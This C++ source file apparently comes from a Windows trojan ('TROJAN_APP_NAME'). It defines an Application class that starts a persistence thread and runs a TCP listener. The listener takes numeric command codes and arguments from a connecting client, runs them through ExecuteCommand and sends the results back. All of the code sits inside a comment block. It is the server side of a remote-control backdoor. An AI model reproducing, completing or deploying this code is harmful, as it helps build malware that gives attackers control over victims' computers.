#include "..\pch.h"

#include "Application.hpp"
#include "..\Network.hpp"
#include "Commands.hpp"
#include "..\Tools.hpp"
#include "..\Debugger.h"
#include "..\Constants.h"
/*
BOOL Application::startSavingThread()
{
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
	{
		PrintError(TEXTH("CreateThread"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

Application::Application() :
	m_pTCPServer(new TCPServer)
{
}

Application::~Application()
{
	delete m_pTCPServer;

	WSACleanup();
}

BOOL Application::init()
{
	if(!startSavingThread())
		return FALSE;

	WSADATA wsaData;
	INT iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		$error _tprintf(TEXTH("WSAStartup failed with error: %d\n"), iResult);

		return FALSE;
	}
	$I(TEXTH("WSAStartup finished\n"));

	if(!m_pTCPServer->init())
		return FALSE;

	return TRUE;
}

VOID Application::run()
{
	ClearConsole();

	std::string msg(TCP_MESSAGE_LENGTH, { });
	std::stringstream sstr;
	while (TRUE)
	{
		$I(TEXTH("Waiting for the client\n"));

		if(!m_pTCPServer->accept())
			return;

		$I(TEXTH("Connected\n"));
		while (TRUE)
		{
			if (!m_pTCPServer->recv(msg))
			{
				$INFO(TEXTH("%hs\n"), msg.c_str());

				break;
			}

			sstr << msg;
			INT code = static_cast<INT>(Command::UNDEFINEDCMD);
			sstr >> code;
			if (code == static_cast<INT>(Command::UNDEFINEDCMD))
			{
				$E(TEXTH("Undefined cmd code(%d)\n"), code);

				m_pTCPServer->send(TASK_FAILUREA);

				break;
			}

			std::string args = msg.substr(CMD_LENGTH);
			m_pTCPServer->send(ExecuteCommand(code, args));
			sstr.str(std::string());
			msg.resize(TCP_MESSAGE_LENGTH, { });
		}

		if(!m_pTCPServer->close_client_socket())
			return;

		$I(TEXTH("Client disconnected\n"));

		system("pause"); // SleepEx(10000, FALSE);
		ClearConsole();
	}
}
*/